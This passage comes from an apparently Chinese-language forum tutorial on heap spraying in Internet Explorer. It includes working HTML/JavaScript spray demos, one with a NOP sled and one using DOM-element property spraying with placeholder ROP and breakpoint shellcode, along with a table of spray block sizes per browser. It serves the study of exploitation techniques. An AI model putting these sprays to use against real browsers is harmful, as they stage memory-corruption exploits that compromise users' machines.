
```html
<html>

<SCRIPT language="JavaScript"> 

var sc = unescape("%ucccc%ucccc"); 

var nop = unescape("%u0c0c%u0c0c");

while (nop.length < 0x100000) 

    nop += nop; 

nop=nop.substring(0, (0x40000-6)/2); 

heap_chunks = new Array(); 

for (i = 0 ; i < 1000 ; i++) 

{

    code=nop+i;

    heap_chunks[i] = code.substring(0, code.length);

}

</SCRIPT>

</html>
```

我们这里演示了堆喷射的结果，如下图：

![](https://bbs.kanxue.com/upload/attach/201712/BW7Y6WPY3NRA58U.png)

## 8. IE10 环境下的堆喷射

到了 IE10 这里，情况就有一些不一样了。IE10 浏览器中禁止了喷射 BSTR（JavaScript string）的操作，这意味着自 IE6 发展而来的堆喷射方法已经不再奏效了，我们以前的那些方法都不能在 IE10 浏览器下成功进行喷射。

在这种情况下，一种被称为 DOM Element Property Spray（简称 DEPS）的技术由 Corelan Team 提了出来：

`87eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8%4u0W2L8r3q4F1i4K6u0W2j5X3g2Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9J5c8U0t1H3x3e0y4Q4x3V1j5H3x3W2)9J5c8U0p5&6i4K6u0r3k6r3g2H3M7#2)9J5k6s2m8J5k6h3y4A6M7$3g2Q4x3X3c8Z5k6h3q4H3i4K6u0V1M7%4m8J5j5i4W2Q4x3X3c8G2L8W2)9J5k6r3k6A6M7X3g2X3L8%4S2Q4x3X3c8S2L8X3c8Q4x3X3c8A6k6e0p5H3i4K6u0r3i4@1g2r3i4@1u0o6i4K6R3&6`

这项技术可以说是源自联想和类比，因为我们在对 UAF 漏洞进行利用时通常都会使用标签进行占位（后面介绍利用的文章中会详述）。既然创建标签可以分配内存，那么根据这种情况我们会联想到是否可以通过标签进行喷射。

DEPS 技术的思想正是创建大量的 DOM 元素（标签），通过 DOM 元素去喷射内存，并且通过设置 DOM 元素的属性来设置堆喷内存的内容。

并且由于内存布局的不同的原因，在 IE10 下 `0x20302228` 是一个稳定且便于到达的地址。而且利用 DOM 喷射有一个比较凑巧的优点，就是不需要刻意地绕过 Nozzle 缓解机制，其本身就不受 Nozzle 的影响。

下面是一个展示堆喷射效果的 DEMO。因为 IE10 浏览器是随着 Windows 8 一起发布的，所以我们这里使用 Windows 8 作为测试环境。

```html
<html> 

<head></head> 

<body> 

<div id='blah'></div> 

<script language='javascript'> 

         var div_container = document.getElementById('blah'); 

         div_container.style.cssText = "display:none"; 

         var data; 

         offset = 0x104; 

         junk = unescape("%u2020%u2020"); 

         while(junk.length < 0x1000) 

             junk+=junk;          

            rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747"); 

         shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc"); 

         data = junk.substring(0,offset) + rop + shellcode; 

         data += junk.substring(0,0x800-offset-rop.length-shellcode.length); 

         while(data.length < 0x80000) data += data; 

         for (var i=0; i < 0x500; i++) 

         { 

                 var obj = document.createElement("button"); 

                 obj.title = data.substring(0,0x40000-0x58); 

                 div_container.appendChild(obj); 

         } 

</script> 

</body> 

</html>
```

此外还有一个非常有趣的现象，在 x64 的 Win8 和 Win8.1 下，我们一般打开的 IE 浏览器实际上都是 32 位的。那么你可能有疑问，因为 IE 明明提供了 64 位和 32 位两个版本，为什么我们打开的都是 32 位的？

事实上，64 位版本是专为 Metro 界面提供的。如果你从 Metro 启动 IE，就会发现它是 64 位的。我发现这一点是因为我一直使用的是 32 位的 WinDbg，32 位的 WinDbg 是调试不了 64 位进程的。我在调试时发现有时候 IE 进程可以附加，有时候不可以附加，后来查了一下资料才发现是这么回事。

### IE10 的 64 位进程与 32 位进程

![](https://bbs.kanxue.com/upload/attach/201712/V36XGYCYXU4PA4K.png)

![](https://bbs.kanxue.com/upload/attach/201712/BCT65F2HGAT96WZ.png)

## 9. IE11 环境下的堆喷射

IE11 是 IE 浏览器的终章，IE11 与 Windows 8.1 系统同时发布。

其实单纯说喷射的话与 IE10 相似，但是由于 IE11 浏览器已经加入了很多新的漏洞缓解措施，出于漏洞利用的考虑，我们此时单独讨论堆喷射已经没有什么意义了。换而言之，此时喷射内存的目的已经与之前完全不同了。

我们会在后面的利用部分讨论 IE11 中进行 JScript9 Heap Feng Shui 布局的意义。

## 10. 使用 Heaplib 进行堆喷射

Heaplib 是一个方便进行精准堆喷射的库。

由于 IE 浏览器的堆很可能存在空洞，这样的话会对我们的堆布局造成很大影响。Heaplib 会刷新这些缓冲块，以确保申请的块由系统堆分配。详见：

`46aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4m8Z5M7X3g2W2k6r3!0E0i4K6u0W2L8%4u0Y4i4K6u0r3M7X3g2K6k6h3q4J5j5$3S2Q4x3V1k6Z5k6h3q4H3i4K6u0V1k6X3g2F1k6#2)9J5k6s2y4Z5N6h3W2Q4x3V1k6Z5k6h3q4H3i4K6u0V1k6X3g2F1k6#2)9J5k6s2y4Z5N6h3W2Q4x3X3g2Z5N6r3#2D9i4K6t1$3L8X3u0K6M7q4)9K6b7W2)9J5z5b7`

但是 Heaplib 只在 IE9 以下的版本中有效，因为 IE9 中存在 Nozzle。不过可以通过我们自己修改 Heaplib 来让它运行在 IE9 上。

## 11. 通过 FLASH 进行喷射

大概是 2014 年，网上开始大量流传使用 Flash 内存布局结合浏览器漏洞进行利用的样本。从技术手段来说，这些使用 FLASH 进行内存布局的样本与我们前面讲的这些堆喷射已经不处于同一个次元了。

结合 Flash 内存布局的利用，本质上讲是试图做一种漏洞的转化，与我们前面讲的这些喷射有本质的不同。这种技术最早应该是由李海飞前辈提出的，我们在后面利用部分会详细说这部分内容，参见：

`fbaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2k6$3!0G2k6$3I4W2i4K6u0W2j5$3!0E0i4K6u0r3N6X3W2W2N6$3g2J5i4K6y4r3N6i4u0D9i4K6y4p5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6K9i4c8W2M7#2)9J5k6h3N6G2L8$3N6D9k6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4A6N6r3g2Q4x3V1k6*7k6i4u0G2k6r3q4&6M7X3g2K6k6h3q4J5j5$3S2Q4x3V1k6K6L8h3q4K6K9r3W2F1k6#2)9#2k6Y4c8Z5k6g2)9#2k6X3S2W2j5i4m8Q4y4h3k6%4K9i4c8Z5i4K6g2X3N6X3g2U0N6r3!0J5i4K6g2X3e0r3W2Q4x3X3g2H3k6r3k6Q4x3@1k6S2N6s2c8J5k6h3c8A6M7X3g2U0N6s2y4Q4x3@1b7H3i4K6t1$3L8X3u0K6M7q4)9K6b7R3`

## 12. 常用堆喷尺寸大小

参考自泉哥博客，这些数据应该说是前辈们的经验总结。

```text
XP SP3 - IE6 block = shellcode.substring(0,0x40000-0x20)

XP SP3 – IE7 block = shellcode.substring(2,0x10000-0×21); 

XP SP3 – IE8 block = shellcode.substring(2, 0x40000-0×21); 

Vista SP2 – IE7 block = shellcode.substring(0, (0x40000-6)/2); 

Vista SP2 – IE8 block = shellcode.substring(0, (0x40000-6)/2); 

Win7 – IE8 block = shellcode.substring(0, (0x80000-6)/2); 

Vista/Win7 – IE9 block = shellcode.substring(0, (0x40000-6)/2); 

XP SP3/VISTA SP2/WIN7 - Firefox9 block = shellcode.substring(0, (0x40000-6)/2);
```

## 13. x64 下的堆喷射

对 x64 进程进行堆喷射理论上是没有意义的，因为 64 位的地址表示的值过大。以我们目前的计算机配置来说，就算是拿全部的内存进行喷射，也不可能到达喷射需求的地址。

但是在实际漏洞利用中，可能因为漏洞本身的特性导致我们可以通过小范围喷射进行利用，诸如著名的《Exploiting Internet Explorer11 64-bit on Windows 8.1 Preview》文章中的利用。

## 后记

其实这系列的文章，我在去年 10 月份的时候就已经写完了，但是一直在硬盘里放了近半年都没有投出来。我主要是考虑到这系列文章涉及的话题太广、内容太多、历史又太悠久，考虑到自己仅是个大二学生，水平较低，接触漏洞方面也不久，唯恐内容中出现错误和纰漏。

但是做了一番修改后我还是鼓起勇气发出来了，希望大家能够帮忙指出文章中错误和提出修改建议，可以通过微博私信给我。

`id:Ox9A82`

## Reference

《浏览器漏洞攻防对抗的艺术》仙果

http://bbs.pediy.com/thread-211277.htm

《攻破 Windows 8.1 的 64 位 IE》古河

`dd8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3W2U0K9s2g2F1M7h3W2#2i4K6u0W2j5$3!0E0i4K6u0r3j5$3!0#2M7Y4y4W2i4K6u0r3y4e0t1I4y4o6W2Q4x3U0k6F1j5Y4y4H3i4K6y4n7`

《Heap Feng Shui in JavaScript》

`090K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4m8Z5M7X3g2W2k6r3!0E0i4K6u0W2L8%4u0Y4i4K6u0r3M7X3g2K6k6h3q4J5j5$3S2Q4x3V1k6Z5k6h3q4H3i4K6u0V1k6X3g2F1k6#2)9J5k6s2y4Z5N6h3W2Q4x3V1k6Z5k6h3q4H3i4K6u0V1k6X3g2F1k6#2)9J5k6s2y4Z5N6h3W2Q4x3X3g2Z5N6r3#2D9i4K6t1$3L8X3u0K6M7q4)9K6b7R3`

《DEPS —— Precise Heap Spray on Firefox and IE10》

`13fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8%4u0W2L8r3q4F1i4K6u0W2j5X3g2Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9J5c8U0t1H3x3e0y4Q4x3V1j5H3x3W2)9J5c8U0p5&6i4K6u0r3k6r3g2H3M7#2)9J5k6s2m8J5k6h3y4A6M7$3g2Q4x3X3c8Z5k6h3q4H3i4K6u0V1M7%4m8J5j5i4W2Q4x3X3c8G2L8W2)9J5k6r3k6A6M7X3g2X3L8%4S2Q4x3X3c8S2L8X3c8Q4x3X3c8A6k6e0p5H3i4K6u0r3i4K6t1$3L8X3u0K6M7q4)9K6b7R3`

《Exploiting Internet Explorer11 64-bit on Windows 8.1 Preview》

`f14K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3W2X3M7$3g2U0i4K6u0W2j5X3I4G2k6%4y4H3L8%4c8Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5K6i4K6u0r3x3e0q4Q4x3V1k6W2P5s2m8D9L8$3W2@1K9h3&6Y4i4K6u0V1K9h3&6@1k6i4u0F1k6i4c8Q4x3X3c8W2P5s2m8D9L8%4u0W2M7W2)9J5k6o6p5I4i4K6u0V1y4U0c8Q4x3X3c8T1K9i4c8Q4x3X3g2Z5N6r3#2D9i4K6t1$3L8X3u0K6M7q4)9K6b7R3`

《Exploit 编写系列教程第十一篇：堆喷射技术揭秘》

http://bbs.pediy.com/showthread.php?t=151381

《IE Array Object Heap Spraying》

`2daK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3y4F1j5X3I4G2k6%4y4Q4x3X3g2U0L8$3#2Q4x3V1k6%4j5h3H3$3x3e0y4Q4x3V1k6H3i4K6u0r3x3K6V1#2z5o6j5&6x3W2)9J5k6h3S2@1L8h3I4Q4x3U0k6F1j5Y4y4H3i4K6y4n7`

《ASLR BYPASS APOCALYPSE IN RECENT ZERO-DAY EXPLOITS》

`654K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3K9i4u0W2k6i4W2W2i4K6u0W2j5$3!0E0i4K6u0r3j5X3I4G2k6#2)9J5c8Y4c8Z5M7X3g2S2N6q4)9J5k6s2u0W2M7$3g2S2M7X3y4Z5i4K6u0r3x3U0l9I4x3#2)9J5c8U0p5H3i4K6u0r3j5i4y4D9M7W2)9J5k6r3u0&6M7r3q4K6M7#2)9J5k6r3q4H3L8$3y4S2L8s2W2H3M7$3g2Q4x3X3c8A6L8W2)9J5k6r3I4S2N6r3g2D9P5g2)9J5k6s2A6W2M7X3!0Q4x3X3c8V1j5i4W2Q4x3X3c8W2P5s2m8D9L8$3W2@1M7#2)9J5k6h3S2@1L8h3I4Q4x3U0k6F1j5Y4y4H3i4K6y4n7`

《Smashing the Heap with Vector: Advanced Exploitation Technique in Recent Flash Zero-day Attack》

`6baK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2k6$3!0G2k6$3I4W2i4K6u0W2j5$3!0E0i4K6u0r3N6X3W2W2N6$3g2J5i4K6y4r3N6i4u0D9i4K6y4p5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6K9i4c8W2M7#2)9J5k6h3N6G2L8$3N6D9k6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4A6N6r3g2Q4x3V1k6*7k6i4u0G2k6r3q4&6M7X3g2K6k6h3q4J5j5$3S2Q4x3V1k6K6L8h3q4K6K9r3W2F1k6#2)9#2k6Y4c8Z5k6g2)9#2k6X3S2W2j5i4m8Q4y4h3k6%4K9i4c8Z5i4K6g2X3N6X3g2U0N6r3!0J5i4K6g2X3e0r3W2Q4x3X3g2H3k6r3k6Q4x3@1k6S2N6s2c8J5k6h3c8A6M7X3g2U0N6s2y4Q4x3@1b7H3i4K6t1$3L8X3u0K6M7q4)9K6b7R3`
